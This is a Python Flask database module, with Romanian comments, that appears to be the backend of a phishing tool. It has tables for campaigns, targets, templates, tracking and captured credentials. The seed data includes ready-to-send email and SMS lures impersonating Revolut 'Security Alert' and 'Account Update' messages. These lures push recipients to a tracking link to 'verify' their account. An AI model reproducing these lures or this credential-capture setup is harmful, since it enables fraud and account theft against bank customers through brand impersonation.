from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import event
from sqlalchemy.engine import Engine
import sqlite3
import os
import logging

# Inițializarea extensiei SQLAlchemy
db = SQLAlchemy()

def init_db(app):
    """
    Inițializează baza de date cu aplicația Flask
    
    Args:
        app: Instanța Flask app
    """
    try:
        # Configurarea SQLAlchemy cu aplicația
        db.init_app(app)
        
        # Configurarea pentru SQLite (pentru foreign keys support)
        if 'sqlite' in app.config['SQLALCHEMY_DATABASE_URI']:
            configure_sqlite(app)
        
        # Crearea tabelelor în contextul aplicației
        with app.app_context():
            create_tables()
            
        app.logger.info("Database initialized successfully")
        
    except Exception as e:
        app.logger.error(f"Database initialization failed: {str(e)}")
        raise


def configure_sqlite(app):
    """
    Configurează SQLite pentru foreign keys și alte optimizări
    
    Args:
        app: Instanța Flask app
    """
    
    @event.listens_for(Engine, "connect")
    def set_sqlite_pragma(dbapi_connection, connection_record):
        """Activează foreign keys și alte optimizări pentru SQLite"""
        if isinstance(dbapi_connection, sqlite3.Connection):
            cursor = dbapi_connection.cursor()
            # Activează foreign key constraints
            cursor.execute("PRAGMA foreign_keys=ON")
            # Optimizări pentru performanță
            cursor.execute("PRAGMA journal_mode=WAL")
            cursor.execute("PRAGMA synchronous=NORMAL")
            cursor.execute("PRAGMA cache_size=1000")
            cursor.execute("PRAGMA temp_store=MEMORY")
            cursor.close()


def create_tables():
    """
    Creează toate tabelele în baza de date
    """
    try:
        # Importă toate modelele pentru a fi sigur că sunt înregistrate
        from models.campaign import Campaign
        from models.target import Target
        from models.template import Template
        from models.tracking import Tracking
        from models.credential import Credential
        
        # Creează toate tabelele
        db.create_all()
        
        # Creează datele inițiale dacă nu există
        create_initial_data()
        
        logging.info("All database tables created successfully")
        
    except Exception as e:
        logging.error(f"Error creating tables: {str(e)}")
        raise


def create_initial_data():
    """
    Creează date inițiale în baza de date (template-uri default, etc.)
    """
    try:
        from models.template import Template
        
        # Verifică dacă există deja template-uri
        existing_templates = Template.query.count()
        
        if existing_templates == 0:
            # Creează template-uri default
            default_templates = [
                {
                    'name': 'Revolut Security Alert',
                    'type': 'email',
                    'subject': 'Security Alert: Suspicious Activity Detected',
                    'content': '''
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                        <h2 style="color: #0075eb;">Security Alert</h2>
                        <p>Dear {{target_name}},</p>
                        <p>We detected suspicious activity on your Revolut account. Please verify your identity immediately.</p>
                        <a href="{{tracking_link}}" style="background: #0075eb; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px;">Verify Account</a>
                        <p><small>This is an automated message from Revolut Security.</small></p>
                    </div>
                    '''
                },
                {
                    'name': 'Account Update Required',
                    'type': 'email',
                    'subject': 'Action Required: Update Your Account Information',
                    'content': '''
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                        <h2 style="color: #0075eb;">Account Update Required</h2>
                        <p>Hello {{target_name}},</p>
                        <p>Your account information needs to be updated to comply with new regulations.</p>
                        <a href="{{tracking_link}}" style="background: #0075eb; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px;">Update Information</a>
                        <p><small>Revolut Customer Service</small></p>
                    </div>
                    '''
                },
                {
                    'name': 'SMS Security Alert',
                    'type': 'sms',
                    'subject': '',
                    'content': 'REVOLUT ALERT: Suspicious login detected. Verify immediately: {{tracking_link}}'
                }
            ]
            
            for template_data in default_templates:
                template = Template(**template_data)
                db.session.add(template)
            
            db.session.commit()
            logging.info("Default templates created successfully")
            
    except Exception as e:
        logging.error(f"Error creating initial data: {str(e)}")
        db.session.rollback()


def drop_all_tables():
    """
    Șterge toate tabelele din baza de date (folosit în testing)
    """
    try:
        db.drop_all()
        logging.info("All database tables dropped successfully")
    except Exception as e:
        logging.error(f"Error dropping tables: {str(e)}")
        raise


def reset_database():
    """
    Resetează baza de date (șterge și recreează toate tabelele)
    """
    try:
        drop_all_tables()
        create_tables()
        logging.info("Database reset successfully")
    except Exception as e:
        logging.error(f"Error resetting database: {str(e)}")
        raise


def backup_database(backup_path=None):
    """
    Creează un backup al bazei de date SQLite
    
    Args:
        backup_path: Calea unde să salveze backup-ul
    """
    try:
        if backup_path is None:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_path = f"backup_database_{timestamp}.db"
        
        # Pentru SQLite, facem o copie simplă a fișierului
        import shutil
        db_path = db.engine.url.database
        
        if os.path.exists(db_path):
            shutil.copy2(db_path, backup_path)
            logging.info(f"Database backup created: {backup_path}")
            return backup_path
        else:
            logging.warning("Database file not found for backup")
            return None
            
    except Exception as e:
        logging.error(f"Error creating database backup: {str(e)}")
        return None


def get_db_stats():
    """
    Returnează statistici despre baza de date
    
    Returns:
        dict: Dicționar cu statistici
    """
    try:
        from models.campaign import Campaign
        from models.target import Target
        from models.tracking import Tracking
        from models.credential import Credential
        from models.template import Template
        
        stats = {
            'campaigns': Campaign.query.count(),
            'targets': Target.query.count(),
            'templates': Template.query.count(),
            'tracking_events': Tracking.query.count(),
            'captured_credentials': Credential.query.count()
        }
        
        return stats
        
    except Exception as e:
        logging.error(f"Error getting database stats: {str(e)}")
        return {}


# Funcții helper pentru queries comune
def get_or_create(session, model, **kwargs):
    """
    Returnează un obiect existent sau îl creează dacă nu există
    
    Args:
        session: Sesiunea de baza de date
        model: Modelul SQLAlchemy
        **kwargs: Argumentele pentru căutare/creare
        
    Returns:
        tuple: (obiect, created_flag)
    """
    instance = session.query(model).filter_by(**kwargs).first()
    if instance:
        return instance, False
    else:
        instance = model(**kwargs)
        session.add(instance)
        return instance, True